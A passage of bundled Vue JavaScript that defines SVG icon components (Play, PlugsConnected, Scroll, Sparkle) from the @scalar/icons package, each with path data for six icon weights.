			}, null, -1), createBaseVNode("path", { d: "M224,128a8,8,0,0,1-8,8H40a8,8,0,0,1,0-16H216A8,8,0,0,1,224,128Z" }, null, -1)])])) : unref(weight) === "fill" ? (openBlock(), createElementBlock("g", _hoisted_3$56, [..._cache[2] || (_cache[2] = [createBaseVNode("path", { d: "M208,32H48A16,16,0,0,0,32,48V208a16,16,0,0,0,16,16H208a16,16,0,0,0,16-16V48A16,16,0,0,0,208,32ZM184,136H72a8,8,0,0,1,0-16H184a8,8,0,0,1,0,16Z" }, null, -1)])])) : unref(weight) === "light" ? (openBlock(), createElementBlock("g", _hoisted_4$39, [..._cache[3] || (_cache[3] = [createBaseVNode("path", { d: "M222,128a6,6,0,0,1-6,6H40a6,6,0,0,1,0-12H216A6,6,0,0,1,222,128Z" }, null, -1)])])) : unref(weight) === "regular" ? (openBlock(), createElementBlock("g", _hoisted_5$29, [..._cache[4] || (_cache[4] = [createBaseVNode("path", { d: "M224,128a8,8,0,0,1-8,8H40a8,8,0,0,1,0-16H216A8,8,0,0,1,224,128Z" }, null, -1)])])) : unref(weight) === "thin" ? (openBlock(), createElementBlock("g", _hoisted_6$24, [..._cache[5] || (_cache[5] = [createBaseVNode("path", { d: "M220,128a4,4,0,0,1-4,4H40a4,4,0,0,1,0-8H216A4,4,0,0,1,220,128Z" }, null, -1)])])) : createCommentVNode("", true)], 16);
		};
	}
});
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconPlay.vue.script.js
var _hoisted_1$112 = { key: 0 };
var _hoisted_2$74 = { key: 1 };
var _hoisted_3$55 = { key: 2 };
var _hoisted_4$38 = { key: 3 };
var _hoisted_5$28 = { key: 4 };
var _hoisted_6$23 = { key: 5 };
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconPlay.js
var ScalarIconPlay_default = /* @__PURE__ */ defineComponent({
	name: "ScalarIconPlay",
	props: {
		label: {},
		weight: {}
	},
	setup(__props) {
		const { bind, weight } = useScalarIcon(__props);
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("svg", mergeProps({
				xmlns: "http://www.w3.org/2000/svg",
				viewBox: "0 0 256 256",
				fill: "currentColor"
			}, unref(bind)), [renderSlot(_ctx.$slots, "default"), unref(weight) === "bold" ? (openBlock(), createElementBlock("g", _hoisted_1$112, [..._cache[0] || (_cache[0] = [createBaseVNode("path", { d: "M234.49,111.07,90.41,22.94A20,20,0,0,0,60,39.87V216.13a20,20,0,0,0,30.41,16.93l144.08-88.13a19.82,19.82,0,0,0,0-33.86ZM84,208.85V47.15L216.16,128Z" }, null, -1)])])) : unref(weight) === "duotone" ? (openBlock(), createElementBlock("g", _hoisted_2$74, [..._cache[1] || (_cache[1] = [createBaseVNode("path", {
				d: "M228.23,134.69,84.15,222.81A8,8,0,0,1,72,216.12V39.88a8,8,0,0,1,12.15-6.69l144.08,88.12A7.82,7.82,0,0,1,228.23,134.69Z",
				opacity: "0.2"
			}, null, -1), createBaseVNode("path", { d: "M232.4,114.49,88.32,26.35a16,16,0,0,0-16.2-.3A15.86,15.86,0,0,0,64,39.87V216.13A15.94,15.94,0,0,0,80,232a16.07,16.07,0,0,0,8.36-2.35L232.4,141.51a15.81,15.81,0,0,0,0-27ZM80,215.94V40l143.83,88Z" }, null, -1)])])) : unref(weight) === "fill" ? (openBlock(), createElementBlock("g", _hoisted_3$55, [..._cache[2] || (_cache[2] = [createBaseVNode("path", { d: "M240,128a15.74,15.74,0,0,1-7.6,13.51L88.32,229.65a16,16,0,0,1-16.2.3A15.86,15.86,0,0,1,64,216.13V39.87a15.86,15.86,0,0,1,8.12-13.82,16,16,0,0,1,16.2.3L232.4,114.49A15.74,15.74,0,0,1,240,128Z" }, null, -1)])])) : unref(weight) === "light" ? (openBlock(), createElementBlock("g", _hoisted_4$38, [..._cache[3] || (_cache[3] = [createBaseVNode("path", { d: "M231.36,116.19,87.28,28.06a14,14,0,0,0-14.18-.27A13.69,13.69,0,0,0,66,39.87V216.13a13.69,13.69,0,0,0,7.1,12.08,14,14,0,0,0,14.18-.27l144.08-88.13a13.82,13.82,0,0,0,0-23.62Zm-6.26,13.38L81,217.7a2,2,0,0,1-2.06,0,1.78,1.78,0,0,1-1-1.61V39.87a1.78,1.78,0,0,1,1-1.61A2.06,2.06,0,0,1,80,38a2,2,0,0,1,1,.31L225.1,126.43a1.82,1.82,0,0,1,0,3.14Z" }, null, -1)])])) : unref(weight) === "regular" ? (openBlock(), createElementBlock("g", _hoisted_5$28, [..._cache[4] || (_cache[4] = [createBaseVNode("path", { d: "M232.4,114.49,88.32,26.35a16,16,0,0,0-16.2-.3A15.86,15.86,0,0,0,64,39.87V216.13A15.94,15.94,0,0,0,80,232a16.07,16.07,0,0,0,8.36-2.35L232.4,141.51a15.81,15.81,0,0,0,0-27ZM80,215.94V40l143.83,88Z" }, null, -1)])])) : unref(weight) === "thin" ? (openBlock(), createElementBlock("g", _hoisted_6$23, [..._cache[5] || (_cache[5] = [createBaseVNode("path", { d: "M230.32,117.9,86.24,29.79a11.91,11.91,0,0,0-12.17-.23A11.71,11.71,0,0,0,68,39.89V216.11a11.71,11.71,0,0,0,6.07,10.33,11.91,11.91,0,0,0,12.17-.23L230.32,138.1a11.82,11.82,0,0,0,0-20.2Zm-4.18,13.37L82.06,219.39a4,4,0,0,1-4.07.07,3.77,3.77,0,0,1-2-3.35V39.89a3.77,3.77,0,0,1,2-3.35,4,4,0,0,1,4.07.07l144.08,88.12a3.8,3.8,0,0,1,0,6.54Z" }, null, -1)])])) : createCommentVNode("", true)], 16);
		};
	}
});
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconPlugsConnected.vue.script.js
var _hoisted_1$111 = { key: 0 };
var _hoisted_2$73 = { key: 1 };
var _hoisted_3$54 = { key: 2 };
var _hoisted_4$37 = { key: 3 };
var _hoisted_5$27 = { key: 4 };
var _hoisted_6$22 = { key: 5 };
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconPlugsConnected.js
var ScalarIconPlugsConnected_default = /* @__PURE__ */ defineComponent({
	name: "ScalarIconPlugsConnected",
	props: {
		label: {},
		weight: {}
	},
	setup(__props) {
		const { bind, weight } = useScalarIcon(__props);
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("svg", mergeProps({
				xmlns: "http://www.w3.org/2000/svg",
				viewBox: "0 0 256 256",
				fill: "currentColor"
			}, unref(bind)), [renderSlot(_ctx.$slots, "default"), unref(weight) === "bold" ? (openBlock(), createElementBlock("g", _hoisted_1$111, [..._cache[0] || (_cache[0] = [createBaseVNode("path", { d: "M240.49,15.51a12,12,0,0,0-17,0L173.94,65.09l-2.54-2.55a36.05,36.05,0,0,0-50.91,0L100,83l-3.51-3.52a12,12,0,0,0-17,17L83,100,62.54,120.49a36,36,0,0,0,0,50.91l2.55,2.54L15.51,223.51a12,12,0,0,0,17,17l49.57-49.58,2.54,2.55a36.06,36.06,0,0,0,50.91,0L156,173l3.51,3.52a12,12,0,0,0,17-17L173,156l20.49-20.49a36,36,0,0,0,0-50.91l-2.55-2.54,49.58-49.57A12,12,0,0,0,240.49,15.51Zm-121.95,161a12,12,0,0,1-17,0L79.51,154.43a12,12,0,0,1,0-17L100,117l39,39Zm58-57.95h0L156,139l-39-39,20.49-20.49a12,12,0,0,1,17,0l22.06,22.06a12,12,0,0,1,0,17ZM85.27,33.37a12,12,0,0,1,21.46-10.74l8,16A12,12,0,1,1,93.27,49.37Zm-68,57.26a12,12,0,0,1,16.1-5.36l16,8a12,12,0,1,1-10.74,21.46l-16-8A12,12,0,0,1,17.27,90.63Zm221.46,74.74a12,12,0,0,1-16.1,5.36l-16-8a12,12,0,0,1,10.74-21.46l16,8A12,12,0,0,1,238.73,165.37Zm-68,57.26a12,12,0,1,1-21.46,10.74l-8-16a12,12,0,0,1,21.46-10.74Z" }, null, -1)])])) : unref(weight) === "duotone" ? (openBlock(), createElementBlock("g", _hoisted_2$73, [..._cache[1] || (_cache[1] = [createBaseVNode("path", {
				d: "M185,127,127,185a24,24,0,0,1-33.94,0L71,162.91A24,24,0,0,1,71,129L129,71a24,24,0,0,1,33.94,0L185,93.09A24,24,0,0,1,185,127Z",
				opacity: "0.2"
			}, null, -1), createBaseVNode("path", { d: "M237.66,18.34a8,8,0,0,0-11.32,0l-52.4,52.41-5.37-5.38a32.05,32.05,0,0,0-45.26,0L100,88.69l-6.34-6.35A8,8,0,0,0,82.34,93.66L88.69,100,65.37,123.31a32,32,0,0,0,0,45.26l5.38,5.37-52.41,52.4a8,8,0,0,0,11.32,11.32l52.4-52.41,5.37,5.38a32.06,32.06,0,0,0,45.26,0L156,167.31l6.34,6.35a8,8,0,0,0,11.32-11.32L167.31,156l23.32-23.31a32,32,0,0,0,0-45.26l-5.38-5.37,52.41-52.4A8,8,0,0,0,237.66,18.34Zm-116.29,161a16,16,0,0,1-22.62,0L76.69,157.25a16,16,0,0,1,0-22.62L100,111.31,144.69,156Zm57.94-57.94h0L156,144.69,111.31,100l23.32-23.31a16,16,0,0,1,22.62,0l22.06,22a16,16,0,0,1,0,22.63ZM88.57,35A8,8,0,0,1,103.43,29l8,20A8,8,0,0,1,96.57,55ZM24.57,93A8,8,0,0,1,35,88.57l20,8A8,8,0,0,1,49,111.43l-20-8A8,8,0,0,1,24.57,93ZM231.43,163a8,8,0,0,1-10.4,4.46l-20-8A8,8,0,1,1,207,144.57l20,8A8,8,0,0,1,231.43,163Zm-64,58.06A8,8,0,0,1,152.57,227l-8-20A8,8,0,0,1,159.43,201Z" }, null, -1)])])) : unref(weight) === "fill" ? (openBlock(), createElementBlock("g", _hoisted_3$54, [..._cache[2] || (_cache[2] = [createBaseVNode("path", { d: "M88.57,35A8,8,0,0,1,103.43,29l8,20A8,8,0,0,1,96.57,55ZM29,103.43l20,8A8,8,0,1,0,55,96.57l-20-8A8,8,0,0,0,29,103.43ZM227,152.57l-20-8A8,8,0,1,0,201,159.43l20,8A8,8,0,0,0,227,152.57ZM159.43,201A8,8,0,0,0,144.57,207l8,20A8,8,0,1,0,167.43,221ZM237.91,18.52a8,8,0,0,0-11.5-.18L174,70.75l-5.38-5.38a32,32,0,0,0-45.28,0L106.14,82.54a4,4,0,0,0,0,5.66l61.7,61.66a4,4,0,0,0,5.66,0l16.74-16.74a32.76,32.76,0,0,0,9.81-22.52,31.82,31.82,0,0,0-9.37-23.17l-5.38-5.37,52.2-52.17A8.22,8.22,0,0,0,237.91,18.52ZM85.64,90.34a8,8,0,0,0-11.49.18,8.22,8.22,0,0,0,.41,11.37L80.67,108,65.34,123.31A31.82,31.82,0,0,0,56,146.47,32.75,32.75,0,0,0,65.77,169l5,4.94L18.49,226.13a8.21,8.21,0,0,0-.61,11.1,8,8,0,0,0,11.72.43L82,185.25l5.37,5.38a32.1,32.1,0,0,0,45.29,0L148,175.31l6.34,6.35a8,8,0,0,0,11.32-11.32Z" }, null, -1)])])) : unref(weight) === "light" ? (openBlock(), createElementBlock("g", _hoisted_4$37, [..._cache[3] || (_cache[3] = [createBaseVNode("path", { d: "M236.24,19.76a6,6,0,0,0-8.48,0L173.94,73.57l-6.79-6.78a30,30,0,0,0-42.42,0L100,91.51l-7.76-7.75a6,6,0,0,0-8.48,8.48L91.51,100,66.79,124.73a30,30,0,0,0,0,42.42l6.78,6.79L19.76,227.76a6,6,0,1,0,8.48,8.48l53.82-53.81,6.79,6.78a30,30,0,0,0,42.42,0L156,164.49l7.76,7.75a6,6,0,0,0,8.48-8.48L164.49,156l24.72-24.73a30,30,0,0,0,0-42.42l-6.78-6.79,53.81-53.82A6,6,0,0,0,236.24,19.76Zm-113.45,161a18,18,0,0,1-25.46,0L75.27,158.67a18,18,0,0,1,0-25.46L100,108.49,147.51,156Zm57.94-57.94L156,147.51,108.49,100l24.72-24.73a18,18,0,0,1,25.46,0l22.06,22.06a18,18,0,0,1,0,25.46ZM90.43,34.23a6,6,0,0,1,11.14-4.46l8,20a6,6,0,1,1-11.14,4.46Zm-64,59.54a6,6,0,0,1,7.8-3.34l20,8a6,6,0,1,1-4.46,11.14l-20-8A6,6,0,0,1,26.43,93.77Zm203.14,68.46a6,6,0,0,1-7.8,3.34l-20-8a6,6,0,0,1,4.46-11.14l20,8A6,6,0,0,1,229.57,162.23Zm-64,59.54a6,6,0,1,1-11.14,4.46l-8-20a6,6,0,0,1,11.14-4.46Z" }, null, -1)])])) : unref(weight) === "regular" ? (openBlock(), createElementBlock("g", _hoisted_5$27, [..._cache[4] || (_cache[4] = [createBaseVNode("path", { d: "M237.66,18.34a8,8,0,0,0-11.32,0l-52.4,52.41-5.37-5.38a32.05,32.05,0,0,0-45.26,0L100,88.69l-6.34-6.35A8,8,0,0,0,82.34,93.66L88.69,100,65.37,123.31a32,32,0,0,0,0,45.26l5.38,5.37-52.41,52.4a8,8,0,0,0,11.32,11.32l52.4-52.41,5.37,5.38a32,32,0,0,0,45.26,0L156,167.31l6.34,6.35a8,8,0,0,0,11.32-11.32L167.31,156l23.32-23.31a32,32,0,0,0,0-45.26l-5.38-5.37,52.41-52.4A8,8,0,0,0,237.66,18.34Zm-116.29,161a16,16,0,0,1-22.62,0L76.69,157.25a16,16,0,0,1,0-22.62L100,111.31,144.69,156Zm57.94-57.94L156,144.69,111.31,100l23.32-23.31a16,16,0,0,1,22.62,0l22.06,22A16,16,0,0,1,179.31,121.37ZM88.57,35A8,8,0,0,1,103.43,29l8,20A8,8,0,0,1,96.57,55ZM24.57,93A8,8,0,0,1,35,88.57l20,8A8,8,0,0,1,49,111.43l-20-8A8,8,0,0,1,24.57,93ZM231.43,163a8,8,0,0,1-10.4,4.46l-20-8A8,8,0,1,1,207,144.57l20,8A8,8,0,0,1,231.43,163Zm-64,58.06A8,8,0,0,1,152.57,227l-8-20A8,8,0,0,1,159.43,201Z" }, null, -1)])])) : unref(weight) === "thin" ? (openBlock(), createElementBlock("g", _hoisted_6$22, [..._cache[5] || (_cache[5] = [createBaseVNode("path", { d: "M234.83,21.17a4,4,0,0,0-5.66,0L173.94,76.4l-8.2-8.2a28,28,0,0,0-39.6,0L100,94.34l-9.17-9.17a4,4,0,0,0-5.66,5.66L94.34,100,68.2,126.14a28,28,0,0,0,0,39.6l8.2,8.2L21.17,229.17a4,4,0,0,0,5.66,5.66L82.06,179.6l8.2,8.2a28,28,0,0,0,39.6,0L156,161.66l9.17,9.17a4,4,0,0,0,5.66-5.66L161.66,156l26.14-26.14a28,28,0,0,0,0-39.6l-8.2-8.2,55.23-55.23A4,4,0,0,0,234.83,21.17Zm-110.63,161a20,20,0,0,1-28.28,0L73.86,160.08a20,20,0,0,1,0-28.28L100,105.66,150.34,156Zm57.94-57.94L156,150.34,105.66,100,131.8,73.86a20,20,0,0,1,28.28,0l22.06,22.06A20,20,0,0,1,182.14,124.2ZM92.29,33.49a4,4,0,1,1,7.42-3l8,20a4,4,0,0,1-2.22,5.2A3.91,3.91,0,0,1,104,56a4,4,0,0,1-3.71-2.51Zm-64,61a4,4,0,0,1,5.2-2.22l20,8A4,4,0,0,1,52,108a3.91,3.91,0,0,1-1.49-.29l-20-8A4,4,0,0,1,28.29,94.51Zm199.42,67A4,4,0,0,1,224,164a3.91,3.91,0,0,1-1.49-.29l-20-8a4,4,0,1,1,3-7.42l20,8A4,4,0,0,1,227.71,161.49Zm-64,61a4,4,0,0,1-2.22,5.2A3.91,3.91,0,0,1,160,228a4,4,0,0,1-3.71-2.51l-8-20a4,4,0,0,1,7.42-3Z" }, null, -1)])])) : createCommentVNode("", true)], 16);
		};
	}
});
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconScroll.vue.script.js
var _hoisted_1$110 = { key: 0 };
var _hoisted_2$72 = { key: 1 };
var _hoisted_3$53 = { key: 2 };
var _hoisted_4$36 = { key: 3 };
var _hoisted_5$26 = { key: 4 };
var _hoisted_6$21 = { key: 5 };
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconScroll.js
var ScalarIconScroll_default = /* @__PURE__ */ defineComponent({
	name: "ScalarIconScroll",
	props: {
		label: {},
		weight: {}
	},
	setup(__props) {
		const { bind, weight } = useScalarIcon(__props);
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("svg", mergeProps({
				xmlns: "http://www.w3.org/2000/svg",
				viewBox: "0 0 256 256",
				fill: "currentColor"
			}, unref(bind)), [renderSlot(_ctx.$slots, "default"), unref(weight) === "bold" ? (openBlock(), createElementBlock("g", _hoisted_1$110, [..._cache[0] || (_cache[0] = [createBaseVNode("path", { d: "M92,92a12,12,0,0,1,12-12h60a12,12,0,0,1,0,24H104A12,12,0,0,1,92,92Zm12,52h60a12,12,0,0,0,0-24H104a12,12,0,0,0,0,24Zm132,48a36,36,0,0,1-36,36H88a36,36,0,0,1-36-36V64a12,12,0,0,0-24,0c0,3.73,3.35,6.51,3.38,6.54l-.18-.14h0A12,12,0,1,1,16.81,89.59h0C15.49,88.62,4,79.55,4,64A36,36,0,0,1,40,28H176a36,36,0,0,1,36,36V164h4a12,12,0,0,1,7.2,2.4C224.51,167.38,236,176.45,236,192ZM92.62,172.2A12,12,0,0,1,104,164h84V64a12,12,0,0,0-12-12H73.94A35.88,35.88,0,0,1,76,64V192a12,12,0,0,0,24,0c0-3.58-3.17-6.38-3.2-6.4A12,12,0,0,1,92.62,172.2ZM212,192a7.69,7.69,0,0,0-1.24-4h-87a30.32,30.32,0,0,1,.26,4,35.84,35.84,0,0,1-2.06,12H200A12,12,0,0,0,212,192Z" }, null, -1)])])) : unref(weight) === "duotone" ? (openBlock(), createElementBlock("g", _hoisted_2$72, [..._cache[1] || (_cache[1] = [createBaseVNode("path", {
				d: "M200,176H104s8,6,8,16a24,24,0,0,1-48,0V64A24,24,0,0,0,40,40H176a24,24,0,0,1,24,24Z",
				opacity: "0.2"
			}, null, -1), createBaseVNode("path", { d: "M96,104a8,8,0,0,1,8-8h64a8,8,0,0,1,0,16H104A8,8,0,0,1,96,104Zm8,40h64a8,8,0,0,0,0-16H104a8,8,0,0,0,0,16Zm128,48a32,32,0,0,1-32,32H88a32,32,0,0,1-32-32V64a16,16,0,0,0-32,0c0,5.74,4.83,9.62,4.88,9.66h0A8,8,0,0,1,24,88a7.89,7.89,0,0,1-4.79-1.61h0C18.05,85.54,8,77.61,8,64A32,32,0,0,1,40,32H176a32,32,0,0,1,32,32V168h8a8,8,0,0,1,4.8,1.6C222,170.46,232,178.39,232,192ZM96.26,173.48A8.07,8.07,0,0,1,104,168h88V64a16,16,0,0,0-16-16H67.69A31.71,31.71,0,0,1,72,64V192a16,16,0,0,0,32,0c0-5.74-4.83-9.62-4.88-9.66A7.82,7.82,0,0,1,96.26,173.48ZM216,192a12.58,12.58,0,0,0-3.23-8h-94a26.92,26.92,0,0,1,1.21,8,31.82,31.82,0,0,1-4.29,16H200A16,16,0,0,0,216,192Z" }, null, -1)])])) : unref(weight) === "fill" ? (openBlock(), createElementBlock("g", _hoisted_3$53, [..._cache[2] || (_cache[2] = [createBaseVNode("path", { d: "M220.8,169.6A8,8,0,0,0,216,168h-8V64a32,32,0,0,0-32-32H40A32,32,0,0,0,8,64C8,77.61,18.05,85.54,19.2,86.4h0A7.89,7.89,0,0,0,24,88a8,8,0,0,0,4.87-14.33h0C28.83,73.62,24,69.74,24,64a16,16,0,0,1,32,0V192a32,32,0,0,0,32,32H200a32,32,0,0,0,32-32C232,178.39,222,170.46,220.8,169.6ZM104,96h64a8,8,0,0,1,0,16H104a8,8,0,0,1,0-16Zm-8,40a8,8,0,0,1,8-8h64a8,8,0,0,1,0,16H104A8,8,0,0,1,96,136Zm104,72H107.71A31.82,31.82,0,0,0,112,192a26.92,26.92,0,0,0-1.21-8h102a12.58,12.58,0,0,1,3.23,8A16,16,0,0,1,200,208Z" }, null, -1)])])) : unref(weight) === "light" ? (openBlock(), createElementBlock("g", _hoisted_4$36, [..._cache[3] || (_cache[3] = [createBaseVNode("path", { d: "M98,136a6,6,0,0,1,6-6h64a6,6,0,0,1,0,12H104A6,6,0,0,1,98,136Zm6-26h64a6,6,0,0,0,0-12H104a6,6,0,0,0,0,12Zm126,82a30,30,0,0,1-30,30H88a30,30,0,0,1-30-30V64a18,18,0,0,0-36,0c0,6.76,5.58,11.19,5.64,11.23A6,6,0,1,1,20.4,84.8C20,84.48,10,76.85,10,64A30,30,0,0,1,40,34H176a30,30,0,0,1,30,30V170h10a6,6,0,0,1,3.6,1.2C220,171.52,230,179.15,230,192Zm-124,0c0-6.76-5.59-11.19-5.64-11.23A6,6,0,0,1,104,170h90V64a18,18,0,0,0-18-18H64a29.82,29.82,0,0,1,6,18V192a18,18,0,0,0,36,0Zm112,0a14.94,14.94,0,0,0-4.34-10H115.88A24.83,24.83,0,0,1,118,192a29.87,29.87,0,0,1-6,18h88A18,18,0,0,0,218,192Z" }, null, -1)])])) : unref(weight) === "regular" ? (openBlock(), createElementBlock("g", _hoisted_5$26, [..._cache[4] || (_cache[4] = [createBaseVNode("path", { d: "M96,104a8,8,0,0,1,8-8h64a8,8,0,0,1,0,16H104A8,8,0,0,1,96,104Zm8,40h64a8,8,0,0,0,0-16H104a8,8,0,0,0,0,16Zm128,48a32,32,0,0,1-32,32H88a32,32,0,0,1-32-32V64a16,16,0,0,0-32,0c0,5.74,4.83,9.62,4.88,9.66h0A8,8,0,0,1,24,88a7.89,7.89,0,0,1-4.79-1.61h0C18.05,85.54,8,77.61,8,64A32,32,0,0,1,40,32H176a32,32,0,0,1,32,32V168h8a8,8,0,0,1,4.8,1.6C222,170.46,232,178.39,232,192ZM96.26,173.48A8.07,8.07,0,0,1,104,168h88V64a16,16,0,0,0-16-16H67.69A31.71,31.71,0,0,1,72,64V192a16,16,0,0,0,32,0c0-5.74-4.83-9.62-4.88-9.66A7.82,7.82,0,0,1,96.26,173.48ZM216,192a12.58,12.58,0,0,0-3.23-8h-94a26.92,26.92,0,0,1,1.21,8,31.82,31.82,0,0,1-4.29,16H200A16,16,0,0,0,216,192Z" }, null, -1)])])) : unref(weight) === "thin" ? (openBlock(), createElementBlock("g", _hoisted_6$21, [..._cache[5] || (_cache[5] = [createBaseVNode("path", { d: "M100,104a4,4,0,0,1,4-4h64a4,4,0,0,1,0,8H104A4,4,0,0,1,100,104Zm4,36h64a4,4,0,0,0,0-8H104a4,4,0,0,0,0,8Zm124,52a28,28,0,0,1-28,28H88a28,28,0,0,1-28-28V64a20,20,0,0,0-40,0c0,7.78,6.34,12.75,6.4,12.8a4,4,0,1,1-4.8,6.4C21.21,82.91,12,75.86,12,64A28,28,0,0,1,40,36H176a28,28,0,0,1,28,28V172h12a4,4,0,0,1,2.4.8C218.79,173.09,228,180.14,228,192Zm-120,0c0-7.78-6.34-12.75-6.4-12.8A4,4,0,0,1,104,172h92V64a20,20,0,0,0-20-20H59.57A27.9,27.9,0,0,1,68,64V192a20,20,0,0,0,40,0Zm112,0c0-6-3.74-10.3-5.5-12H112.61A23.31,23.31,0,0,1,116,192a27.94,27.94,0,0,1-8.42,20H200A20,20,0,0,0,220,192Z" }, null, -1)])])) : createCommentVNode("", true)], 16);
		};
	}
});
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconSparkle.vue.script.js
var _hoisted_1$109 = { key: 0 };
var _hoisted_2$71 = { key: 1 };
var _hoisted_3$52 = { key: 2 };
var _hoisted_4$35 = { key: 3 };
var _hoisted_5$25 = { key: 4 };
var _hoisted_6$20 = { key: 5 };
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconSparkle.js
var ScalarIconSparkle_default = /* @__PURE__ */ defineComponent({
	name: "ScalarIconSparkle",
	props: {
		label: {},
		weight: {}
	},
	setup(__props) {
		const { bind, weight } = useScalarIcon(__props);
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("svg", mergeProps({
				xmlns: "http://www.w3.org/2000/svg",
				viewBox: "0 0 256 256",
				fill: "currentColor"
			}, unref(bind)), [renderSlot(_ctx.$slots, "default"), unref(weight) === "bold" ? (openBlock(), createElementBlock("g", _hoisted_1$109, [..._cache[0] || (_cache[0] = [createBaseVNode("path", { d: "M199,125.31l-49.88-18.39L130.69,57a19.92,19.92,0,0,0-37.38,0L74.92,106.92,25,125.31a19.92,19.92,0,0,0,0,37.38l49.88,18.39L93.31,231a19.92,19.92,0,0,0,37.38,0l18.39-49.88L199,162.69a19.92,19.92,0,0,0,0-37.38Zm-63.38,35.16a12,12,0,0,0-7.11,7.11L112,212.28l-16.47-44.7a12,12,0,0,0-7.11-7.11L43.72,144l44.7-16.47a12,12,0,0,0,7.11-7.11L112,75.72l16.47,44.7a12,12,0,0,0,7.11,7.11L180.28,144ZM140,40a12,12,0,0,1,12-12h12V16a12,12,0,0,1,24,0V28h12a12,12,0,0,1,0,24H188V64a12,12,0,0,1-24,0V52H152A12,12,0,0,1,140,40ZM252,88a12,12,0,0,1-12,12h-4v4a12,12,0,0,1-24,0v-4h-4a12,12,0,0,1,0-24h4V72a12,12,0,0,1,24,0v4h4A12,12,0,0,1,252,88Z" }, null, -1)])])) : unref(weight) === "duotone" ? (openBlock(), createElementBlock("g", _hoisted_2$71, [..._cache[1] || (_cache[1] = [createBaseVNode("path", {
				d: "M194.82,151.43l-55.09,20.3-20.3,55.09a7.92,7.92,0,0,1-14.86,0l-20.3-55.09-55.09-20.3a7.92,7.92,0,0,1,0-14.86l55.09-20.3,20.3-55.09a7.92,7.92,0,0,1,14.86,0l20.3,55.09,55.09,20.3A7.92,7.92,0,0,1,194.82,151.43Z",
				opacity: "0.2"
			}, null, -1), createBaseVNode("path", { d: "M197.58,129.06,146,110l-19-51.62a15.92,15.92,0,0,0-29.88,0L78,110l-51.62,19a15.92,15.92,0,0,0,0,29.88L78,178l19,51.62a15.92,15.92,0,0,0,29.88,0L146,178l51.62-19a15.92,15.92,0,0,0,0-29.88ZM137,164.22a8,8,0,0,0-4.74,4.74L112,223.85,91.78,169A8,8,0,0,0,87,164.22L32.15,144,87,123.78A8,8,0,0,0,91.78,119L112,64.15,132.22,119a8,8,0,0,0,4.74,4.74L191.85,144ZM144,40a8,8,0,0,1,8-8h16V16a8,8,0,0,1,16,0V32h16a8,8,0,0,1,0,16H184V64a8,8,0,0,1-16,0V48H152A8,8,0,0,1,144,40ZM248,88a8,8,0,0,1-8,8h-8v8a8,8,0,0,1-16,0V96h-8a8,8,0,0,1,0-16h8V72a8,8,0,0,1,16,0v8h8A8,8,0,0,1,248,88Z" }, null, -1)])])) : unref(weight) === "fill" ? (openBlock(), createElementBlock("g", _hoisted_3$52, [..._cache[2] || (_cache[2] = [createBaseVNode("path", { d: "M208,144a15.78,15.78,0,0,1-10.42,14.94L146,178l-19,51.62a15.92,15.92,0,0,1-29.88,0L78,178l-51.62-19a15.92,15.92,0,0,1,0-29.88L78,110l19-51.62a15.92,15.92,0,0,1,29.88,0L146,110l51.62,19A15.78,15.78,0,0,1,208,144ZM152,48h16V64a8,8,0,0,0,16,0V48h16a8,8,0,0,0,0-16H184V16a8,8,0,0,0-16,0V32H152a8,8,0,0,0,0,16Zm88,32h-8V72a8,8,0,0,0-16,0v8h-8a8,8,0,0,0,0,16h8v8a8,8,0,0,0,16,0V96h8a8,8,0,0,0,0-16Z" }, null, -1)])])) : unref(weight) === "light" ? (openBlock(), createElementBlock("g", _hoisted_4$35, [..._cache[3] || (_cache[3] = [createBaseVNode("path", { d: "M196.89,130.94,144.4,111.6,125.06,59.11a13.92,13.92,0,0,0-26.12,0L79.6,111.6,27.11,130.94a13.92,13.92,0,0,0,0,26.12L79.6,176.4l19.34,52.49a13.92,13.92,0,0,0,26.12,0L144.4,176.4l52.49-19.34a13.92,13.92,0,0,0,0-26.12Zm-4.15,14.86-55.08,20.3a6,6,0,0,0-3.56,3.56l-20.3,55.08a1.92,1.92,0,0,1-3.6,0L89.9,169.66a6,6,0,0,0-3.56-3.56L31.26,145.8a1.92,1.92,0,0,1,0-3.6l55.08-20.3a6,6,0,0,0,3.56-3.56l20.3-55.08a1.92,1.92,0,0,1,3.6,0l20.3,55.08a6,6,0,0,0,3.56,3.56l55.08,20.3a1.92,1.92,0,0,1,0,3.6ZM146,40a6,6,0,0,1,6-6h18V16a6,6,0,0,1,12,0V34h18a6,6,0,0,1,0,12H182V64a6,6,0,0,1-12,0V46H152A6,6,0,0,1,146,40ZM246,88a6,6,0,0,1-6,6H230v10a6,6,0,0,1-12,0V94H208a6,6,0,0,1,0-12h10V72a6,6,0,0,1,12,0V82h10A6,6,0,0,1,246,88Z" }, null, -1)])])) : unref(weight) === "regular" ? (openBlock(), createElementBlock("g", _hoisted_5$25, [..._cache[4] || (_cache[4] = [createBaseVNode("path", { d: "M197.58,129.06,146,110l-19-51.62a15.92,15.92,0,0,0-29.88,0L78,110l-51.62,19a15.92,15.92,0,0,0,0,29.88L78,178l19,51.62a15.92,15.92,0,0,0,29.88,0L146,178l51.62-19a15.92,15.92,0,0,0,0-29.88ZM137,164.22a8,8,0,0,0-4.74,4.74L112,223.85,91.78,169A8,8,0,0,0,87,164.22L32.15,144,87,123.78A8,8,0,0,0,91.78,119L112,64.15,132.22,119a8,8,0,0,0,4.74,4.74L191.85,144ZM144,40a8,8,0,0,1,8-8h16V16a8,8,0,0,1,16,0V32h16a8,8,0,0,1,0,16H184V64a8,8,0,0,1-16,0V48H152A8,8,0,0,1,144,40ZM248,88a8,8,0,0,1-8,8h-8v8a8,8,0,0,1-16,0V96h-8a8,8,0,0,1,0-16h8V72a8,8,0,0,1,16,0v8h8A8,8,0,0,1,248,88Z" }, null, -1)])])) : unref(weight) === "thin" ? (openBlock(), createElementBlock("g", _hoisted_6$20, [..._cache[5] || (_cache[5] = [createBaseVNode("path", { d: 